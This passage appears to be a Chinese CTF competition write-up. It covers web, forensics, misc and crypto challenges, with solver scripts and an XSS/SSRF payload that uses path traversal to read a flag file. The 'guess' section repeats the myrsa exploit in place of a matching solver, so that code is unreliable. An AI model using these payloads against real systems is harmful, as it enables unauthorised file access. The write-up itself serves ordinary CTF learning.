AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; }} 成功获取flag Secrets_Of_Admin考点：SSRF 观察数据库可发现flag文件在superuser账号中，而此账号被禁用了，admin的密码在附件中可得到，登录后利用ssrf将superuser账号的flag文件添加到admin账号下，对content的限制可以利用数组进行bypass content[]=&lt;script&gt;location.href=&quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=../files/flag&amp;checksum=be5a14a8e504a66979f6938338b0662c&quot;;&lt;/script&gt; 再读取即可 /api/files/be5a14a8e504a66979f6938338b0662c MISC层层取证层层套娃取证(确信)给了一个内存和一个虚拟磁盘的取证，先看磁盘，取证大师打开提示存在bitlocker加密用Passware Kit Forensic 2021 v1 (64-bit)能直接梭出来bitlocker的秘钥方法是把001解压出来，然后把2.ntfs放进去，再选择有内存镜像，导入这道题的内存镜像，然后等待…… 当然之后也发现内存中也可以找到，但是已经不重要得到549714-116633-006446-278597-176000-708532-618101-131406解开发现E盘存在一个流量包在udp里面找到一个rar，里面包含了一个flag.docx 然后导出，说压缩包密码是开机密码，然后去看俺的另一篇博客 这里提取的是92EFA7F9F2740956D51157F46521F941 密码xiaoming_handsome，cmd5解一下就行了(不会有人没开会员吧)解压之后发现docx还有密码实在找不到了的时候，挂载一下，发现hint 然后去仿真。。。。。。嗯仿真不出来照着https://www.freesion.com/article/51701409948/#DDE01_8 都不行然后就去导出内存，还是看👴的博客 找到然后密码 可以自己去操作放大看，偏移294435180，宽510结合用户名，得到xiaoming1314，解压成功得到flag flag{9ca871b668f2-b668-097c-cbm8-9op404c891e2} 鸣雏恋改zip解压，在_rels下发现key和love，key是妥妥的零宽 解压之后是两张图，其实这里可以不用解压直接读CRC，可惜写的脚本有问题，还是解压了然后写个脚本，2进制的ASCII from PIL import Imagefrom tqdm import tqdmpath = 'C:\\\\Users\\\\mumuzi\\\\AppData\\\\Local\\\\Temp\\\\鸣雏恋_2dad763070b79f50c4635a906359909a\\\\鸣雏恋\\\\_rels\\\\love\\\\out\\\\'flag = ''for i in tqdm(range(129488)): img = Image.open(path+str(i)+'.png') s = img.getpixel((10,10)) if(str(s) == '1'): flag += '0' elif(str(s) == '3'): flag += '1' else: print('wrong!') exit()s = ''rflag = ''for i in flag: s+=i if len(s)==8: rflag += chr(int(s,2)) s=''print(rflag) 得到base64的png图，图片最下面就是flag flag{57dd74fb21bb1aee50f19421bf836f23} 考古最后的xor我是真的服气这一来怎么直接想得到太浪费时间了先imageinfo，发现是XP，然后pslist列出表，发现cmd正在运行，cmdscan看一下cmd 然后Filescan |grep “Oneclickcleanup.exe”，然后dumpfiles -Q 0x00000000017bcbc0 -D ./一共是得到一个dat和一个iso，dat直接拖IDA32发现是两个异或，第一个异或是存放地址，第二个异或是异或的数据 key是this_a_key，data就是数据，把data导出，写个脚本 s = 'this_a_key'flag = ''#flags = [0x37,0x52,0x35,0x37,0x30,0x02,0x2A,0x06,0x00,0x17,0x00,0x1B,0x49,0x12,0x31,0x05,0x7F,0x38,0x00,0x0D,0x00,0x01,0x07,0x14,0x2C,0x3D,0x1E,0x07,0x09,0x59,0x21,0x1B,0x0C,0x01,0x2C,0x3D,0x0B,0x0E,0x08,0x09,0x18,0x09,0x1D,0x16,0x2C]flags = [0xA4,0xA7,0x78,0x93,0xFE,0xD0,0x45,……中间略,0x79,0x74,0x68,0x69,0x73,0x5F,0x61]for i in range(len(flags)): flag += str(hex(flags[i] ^ ord(s[i%10])))[2:].zfill(2)print(flag)f = open('ffff.dot','wb')f.write(flag.encode()) 得到的ffff.dot用notepad++打开，将16进制转ascii为什么要保存为.dot，因为我在复现我知道是dot我乐意然后WPS打开发现提示版本过低，用office打开 然后就瞎试，比如看16进制，从200h-1800h和1800h到最后是一样的，两者相比较什么的，都试过了，没出继续看内存文件。最后。。。想着可打印ascii的词频和异或，结果异或出了 因为长度只有31位，爆破一下0-f，竟然不对，然后想着一共出现了两次，再去试试，还是不对。麻了因为是dot文档，又想着zip解压直接看源文件，然后再来异或 ???我可去你的吧居然还有一段最终得到flag flag{8bedfdbb-ba42-43d1-858c-c2a5-5012d309} 麻了 ChieftainsSecret首先给了一个文档和一张图片，文档就是题目描述，图片的话是一个古时候的电话搜了一下是怎么用的https://haokan.baidu.com/v?pd=wisenatural&amp;vid=15222023905414500076Jpg图片后面还有rar，foremost提取出来，发现是一堆TLE5501生成的数据，搜了一下他是一个角度的传感器，给了sinP,cosP,sinN,cosN本着不会做就乱试+搜公式的原则，发现想要计算出角度，就得找到tan，于是萌生了sinP/cosP,sinN/cosN,(sinP-sinN)/(cosP-cosN)的想法，想知道角度，就再加上一个ATAN函数，除出来是弧度，就再乘以一个57.3°顺便看了油管的视频，研究了一下四个值的变换https://www.youtube.com/watch?v=y68IdqZs4PM最后在看第三个想法的时候恍然大悟，搞出来也正好是11个峰 上图的意思就是ATAN((sinP-sinN)/(cosP-cosN))*57.3,然后因为ATAN的范围是-90°~90°，所以才会出现到90°的时候马上反转成负的，然后负的又接着变为正的，总之，第一个90°之后，后面的值要加180.第2个90°之后，后面加270，妈的简直找惨了。得到的数字大概为210 210 280 230 160 260 190 90 140 160 210然后去下载一个量角器(PicPickPortable)，发现2正好是90°，所以我直接就排除1了，然后一个个去量，下图举个例 对应7，然后其他的也依次如图得到77085962457 所以flag为flag{77085962457} Cryptomyrsafrom Crypto.Util.number import getPrime,bytes_to_long as b2lfrom math import gcdimport hashlibimport randomimport socketserver KEYSIZE = 512alpha = 2.0314159265358979WELCOME = 'Welcome to use my better RSA!!!!!!So, what do you want now?'menu = '1. encry \\n2. getflag\\n3. exit'String = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz' def proof_of_work(): STR = ''.join([String[random.randint(0,len(String)-1)] for _ in range(16) ]) HASH = hashlib.sha256(STR.encode()).hexdigest() return STR[:4],STR[4:],HASH def key_gen(): while True: p,q = getPrime(KEYSIZE),getPrime(KEYSIZE) e = 0x10001 if gcd(e,(p-1)*(q-1)): break key = [getPrime(int(KEYSIZE*alpha)) for _ in range(128)] return (p,q,e),key # encryptodef encry(message,key,p,q,e): k1,k2 = key[random.randint(0,127)],key[random.randint(0,127)] x = p**2 * (p + 3*q - 1 ) + q**2 * (q + 3*p - 1) y = 2*p*q + p + q z = k1 + k2 c = pow(b2l(message),e,p*q) return x * c + y * c + z # get flagdef getflag(flag,key,p,q,e): return encry(flag,key,p,q,e) class server(socketserver.BaseRequestHandler): def _recv(self): data = self.request.recv(1024) return data.strip() def _send(self, msg, newline=True): if isinstance(msg , bytes): msg += b'\\n' else: msg += '\\n' msg = msg.encode() self.request.sendall(msg) def handle(self): START,END,HASH = proof_of_work() self._send('SHA-256(?+{}) == {}'.format(END,HASH)) RCV = self._recv().decode() if RCV != START: return self._send(&quot;I'm a CryptoRookie,so my Crypto system take time, please wait a minute XD!&quot;) (p,q,e),key = key_gen() flag = open('flag','rb').read() self._send(WELCOME) self._send('This is my public key:\\nn = {}\\ne = {}'.format(str(p*q),str(e))) for _ in range(16): self._send(menu) COI = int(self._recv().decode()) if COI == 1 : self._send('Give me your message') message = self._recv() self._send('Your encry message:') self._send(str(encry(message,key,p,q,e))) elif COI == 2: self._send('This is your favourite:\\n') self._send(str(encry(flag,key,p,q,e))) elif COI == 3: self._send('Bye~') breakclass ForkedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass if __name__ == &quot;__main__&quot;: HOST, PORT = '0.0.0.0', 10001 server = ForkedServer((HOST, PORT), server) server.allow_reuse_address = True server.serve_forever() 刚开始这题也太慢了吧，首先是个$pow$验证，然后产生密钥给了$n,e$,给了两个选项可以选择明文加密，或者直接得到$flag$的密文，跟进加密函数$C=m^e(x+y)+(z_1+z_2)$,而$x+y$可以化简得到$x+y={(p+q)}^3-{(p+q)}^2+(p+q)+4n$，可以认为$-{(p+q)}^2+(p+q)+4n$很小，比如说传$m=1$，得到${(p+q)}^3-{(p+q)}^2+(p+q)+4n+(z_1+z_2)=C$,此时直接对$C$开三次方可以得到$(p+q)$的一个大概值，本地测试的话相差也就几千上万，爆破即可，但是需要找个验证点，可以联立$p+q=l,p*q=n$解方程，如果方程存在解则对应$p+q$成立，也可以通过构造${(p-q)}^2={(p+q)}^2-4n$，当${(p+q)}^2-4n$可以完全开方时成立。得到$p+q$后，求${(p+q)}^3-{(p+q)}^2+(p+q)+4n$,显然这个远远大于$z_1+z_2$,所以$m^e=C//(x+y)$,再$rsa$解密，综上$exp$如下： from hashlib import *from gmpy2 import *from Crypto.Util.number import *from pwn import * p=remote('47.104.85.225',49877)context.log_level='debug' def pow(end,sha): String = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz' for a in String: for b in String: for c in String: for d in String: s=(a+b+c+d).encode()+end if sha256(s).hexdigest()==sha: return a+b+c+d p.recvuntil('SHA-256(?+')end=p.recv(12)print(end)p.recvuntil('== ')sha=p.recvuntil('\\n')[:-1].decode()print(sha)xxx=pow(end,sha)p.sendline(xxx)p.recvuntil('n = ')n=int(p.recvuntil('\\n')[:-1])p.recvuntil('3. exit\\n')p.sendline('1')p.recvuntil('Give me your message')p.sendline('\\x01')p.recvuntil('Your encry message:\\n')c=int(p.recvuntil('\\n')[:-1])p_q=iroot(c,3)[0]print(p_q) while True: p_q=p_q-1 if iroot(p_q*p_q-4*n,2)[1]: M=p_q*p_q*p_q-p_q*p_q+p_q+4*n pp=(p_q+iroot(p_q*p_q-4*n,2)[0])//2 assert n%pp==0 q=n//pp breakp.recvuntil('3. exit\\n')p.sendline('2')p.recvuntil('This is your favourite:\\n')c=int(p.recvuntil('\\n\\n')[:-1])c=c//Mphi=(pp-1)*(q-1)e=65537d=invert(e,phi)m=powmod(c,d,n)print(long_to_bytes(m))#flag{ed649951-9ce9-46e0-a42b-d0ba588e43e1} guessfrom Crypto.Util.number import ( bytes_to_long, getPrime, long_to_bytes, getRandomNBitInteger,)import randomimport hashlibfrom math import gcdimport socketserver KEYSIZE = 512WELCOME = &quot;welcome to my funny challenge !!! Can you guess right 32 times in a row? &quot;String = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&quot; def exgcd(a, b): if b == 0: return 1, 0, a else: x, y, q = exgcd(b, a % b) x, y = y, (x - (a // b) * y) return x, y, q def invert(a,p): x, y, q = exgcd(a,p) if q != 1: raise Exception(&quot;No solution.&quot;) else: return (x + p) % p def lcm(a,b): return a*b // gcd(a,b) def proof_of_work(): STR = &quot;&quot;.join([String[random.randint(0, len(String) - 1)] for _ in range(16)]) HASH = hashlib.sha256(STR.encode()).hexdigest() return STR[:4], STR[4:], HASH def keygen(): # part 1 p, q = getPrime(KEYSIZE), getPrime(KEYSIZE) n = p * q g = n + 1 LAMBDA = lcm(p - 1, q - 1) # part 2 _key = open(&quot;key&quot;, &quot;r&quot;).read() key = [] for i in _key.split(&quot;\\n&quot;): for j in i[1:-1].split(&quot; &quot;): if int(j) not in key: key.append(int(j)) assert len(key) == 80 assert key[0] == 119 and key[1] == 241 and key[2] == 718 and key[3] == 647 return n, g, LAMBDA, key def enc(n, g, m): while 1: r = random.randint(2, n - 1) if gcd(r, n) == 1: break c = (pow(g, m, n ** 2) * pow(r, n, n ** 2)) % (n ** 2) return c def dec(n, g, LAMBDA, c): L1 = (pow(c, LAMBDA, n ** 2) - 1) // n L2 = (pow(g, LAMBDA, n ** 2) - 1) // n m = (invert(L2, n) * L1) % n return m class server(socketserver.BaseRequestHandler): def _recv(self): data = self.request.recv(1024) return data.strip() def _send(self, msg, newline=True): if isinstance(msg, bytes): msg += b&quot;\\n&quot; else: msg += &quot;\\n&quot; msg = msg.encode() self.request.sendall(msg) def handle(self): print(&quot;Service start.&quot;) START, END, HASH = proof_of_work() self._send(&quot;SHA-256(?+{}) == {}&quot;.format(END, HASH)) RCV = self._recv().decode() if RCV != START: return flag = open(&quot;flag&quot;, &quot;rb&quot;).read() self._send(WELCOME) # step 1. KeyGen for _ in range(32): self._send(&quot;round &quot; + str(_+1)) n, g, LAM, KEY = keygen() self._send(&quot;Step 1 - KeyGen. This is my public key.&quot;) self._send(&quot;n = &quot; + str(n)) self._send(&quot;g = &quot; + str(g)) # step 2. Phase 1 self._send( &quot;Step 2 - Phase 1. Now, you can give me one ciphertexts,I will return the corresponding plaintext.&quot; ) self._send(&quot;Please give me one decimal ciphertext.&quot;) cipher = int(self._recv().decode()) plaintext = str(dec(n, g, LAM, cipher)) self._send(&quot;This is the corresponding plaintext.&quot;) self._send(plaintext) # step 3. challenge self._send( &quot;Step 3 - Challenge. Now, you must give me two decimal plaintexts(m0,m1), I will encry them and return a ciphertext randomly&quot; ) self._send(&quot;Give me m0.&quot;) plaintext1 = int(self._recv().decode()) self._send(&quot;Give me m1.&quot;) plaintext2 = int(self._recv().decode()) if ( plaintext1 &lt;= 2 or plaintext2 &lt;= 2 or len(bin(plaintext1)) != len(bin(plaintext2)) ): return R = 2 * random.randint(0, 39) I = random.randint(0, 1) cipher1 = enc(n, g, plaintext1 * plaintext2 * KEY[R]) cipher2 = enc(n, g, plaintext1 * plaintext2 * KEY[R + 1]) self._send(&quot;This is a ciphertext.&quot;) self._send(str([cipher1, cipher2][I])) # step 4. Phase 2 self._send( &quot;Step 4 - Phase 2. Now, you can give me some ciphertexts,I will return the corresponding plaintext.But you can not give me the ciphertext that I give you in step 3.&quot; ) self._send(&quot;Please give me one decimal ciphertext &quot;) cipher = int(self._recv().decode()) plaintext = str(dec(n, g, LAM, cipher)) if int(plaintext) == plaintext1 * plaintext2 * KEY[R] or int(plaintext) == plaintext1 * plaintext2 * KEY[R+1]: return self._send(&quot;This is the corresponding plaintext.&quot;) self._send(plaintext) # step.5 Guess self._send( &quot;Step 5 - Guess. You must tell me which ciphertext was I give you in step 3, 0 or 1(m0 -&gt; c0 , m1 -&gt; c1)?&quot; ) Guess = int(self._recv().decode()) if Guess == I: self._send(&quot;Good! You are right&quot;) else: self._send(&quot;Sorry!&quot;) return self._send(flag) class ForkedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass if __name__ == &quot;__main__&quot;: HOST, PORT = &quot;0.0.0.0&quot;, 10001 server = ForkedServer((HOST, PORT), server) server.allow_reuse_address = True server.serve_forever() from Crypto.Util.number import getRandomNBitIntegerwhile 1: A = [] key = random_matrix(ZZ, 20, 4, x = 100, y =1000) for i in range(20): for j in range(4): if key[i,j] not in A: A.append(key[i,j]) if len(A) == 80: breakhint = Matrix(key * vector([getRandomNBitInteger(1024) for _ in range(4)]) for _ in range(12))open('key','w').write(str(key))open('hint','w').write(str(hint)) 首先看求$key$的部分，$key$是一个$20*4$的小矩阵$A$，乘上一个随机产生的$4*12$的大矩阵$B$得到$hint$，这里矩阵大小指的是数字大小，$key$给了第一个行向量，$AB=H$,可以写成$B^TA^T=H^T$,$H^T$中每个行向量都是$A^T$中行向量的线性组合，也就是说$H^T$中每一个行向量都在$A^T$所所组成的格子中，只需要对$H^T$进行格基规约，就能找到$A^T$的行向量。使用$LLL,BKZ$算法，需要对其参数$delta$修改，求到四个行向量根据已知条件排列再矩阵倒置一下。求到$key$之后进入正题，首先也是个$pow$验证，可以发现加密算法是$paillier$， - $step1$生成密钥给出$n,g$ - $step2$,传入密文返回对应明文，但是没有密文可传也没必要，所以这步应该没啥用的。 - $step3$,传入两个明文$p_1,p_2$,产生随机下标$R$,$R$是偶数，分别加密$p_1p_2k_R$和$p_1p_2k_{R+1}$,再随机返回一个密文。 - $step4$，传入一个密文，但不能是$step3$得到的，然后返回明文。 - $step5$，推断$step3$返回的明文对应的是哪个明文。所以直接到$step3$,随便传两个明文，但需要比特数相同且不小于$2$得到密文，然后$step4$，这里需要用到$paillier$的一个性质$D(c_1*c_2)=m_1+m_2$,也有$D(c^k)=km$,所以只需要传密文的$n$次方，就可以得到明文的$n$倍，就可以得到$key$值，判断$key$值的下标是是偶数还是奇数就行。 from hashlib import *from gmpy2 import *from Crypto.Util.number import *from pwn import *p=remote('47.104.85.225',49877)context.log_level='debug'def pow(end,sha): String = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz' for a in String: for b in String: for c in String: for d in String: s=(a+b+c+d).encode()+end if sha256(s).hexdigest()==sha: return a+b+c+d p.recvuntil('SHA-256(?+')end=p.recv(12)print(end)p.recvuntil('== ')sha=p.recvuntil('\\n')[:-1].decode()print(sha)xxx=pow(end,sha)p.sendline(xxx)p.recvuntil('n = ')n=int(p.recvuntil('\\n')[:-1])p.recvuntil('3. exit\\n')p.sendline('1')p.recvuntil('Give me your message')p.sendline('\\x01')p.recvuntil('Your encry message:\\n')c=int(p.recvuntil('\\n')[:-1])p_q=iroot(c,3)[0]print(p_q)while True: p_q=p_q-1 if iroot(p_q*p_q-4*n,2)[1]: M=p_q*p_q*p_q-p_q*p_q+p_q+4*n pp=(p_q+iroot(p_q*p_q-4*n,2)[0])//2 assert n%pp==0 q=n//pp breakp.recvuntil('3. exit\\n')p.sendline('2')p.recvuntil('This is your favourite:\\n')c=int(p.recvuntil('\\n\\n')[:-1])c=c//Mphi=(pp-1)*(q-1)e=65537d=invert(e,phi)m=powmod(c,d,n)print(long_to_bytes(m))#flag{ed649951-9ce9-46e0-a42b-d0ba588e43e1} random rsafrom Crypto.Util.number import *import gmpy2import libnumimport randomimport binasciiimport os flag=r'flag{}' p=getPrime(512)q=getPrime(512)e=0x10001n=p*qct=pow(flag,e,n)print(&quot;n=&quot;+ n)print(&quot;ct=&quot;+ ct) dp=r''seeds = []for i in range(0,len(dp)): seeds.append(random.randint(0,10000)) res = [] for i in range(0, len(dp)): random.seed(seeds[i]) rands = [] for j in range(0,4): rands.append(random.randint(0,255)) res.append(ord(dp[i]) ^ rands[i%4]) del rands[i%4] print(str(rands)) print(res) print(seeds) # n=81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391# 